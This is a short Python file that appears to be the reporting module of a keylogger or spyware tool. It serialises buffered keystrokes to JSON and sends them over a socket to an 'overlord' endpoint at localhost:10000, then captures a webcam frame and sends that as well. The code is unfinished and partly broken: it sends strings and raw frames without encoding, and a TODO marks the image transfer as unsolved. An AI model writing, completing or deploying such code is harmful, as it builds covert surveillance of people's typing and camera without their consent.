import socket
import json
import cv2

server_address = ('localhost', 10000)

def send_payload_to_socket(payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)
    sock.sendall(payload)
    sock.close()

def send_message_to_overlord(buffered_keys):
    payload = json.dumps([key.__dict__ for key in buffered_keys])
    send_payload_to_socket(payload)
    send_image_to_overlord()

def send_image_to_overlord():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    # TODO figure out how to send this better
    send_payload_to_socket(frame)
    cv2.destroyAllWindows()
